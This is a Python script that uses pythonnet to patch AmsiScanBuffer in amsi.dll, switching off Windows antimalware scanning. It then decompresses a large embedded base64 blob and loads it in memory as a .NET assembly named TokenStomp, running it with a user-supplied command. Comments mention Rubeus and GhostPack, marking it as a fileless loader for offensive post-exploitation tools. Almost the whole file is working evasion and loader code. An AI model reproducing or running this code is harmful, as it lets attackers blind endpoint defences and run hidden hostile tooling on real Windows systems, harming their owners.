import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("TokenStomp.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()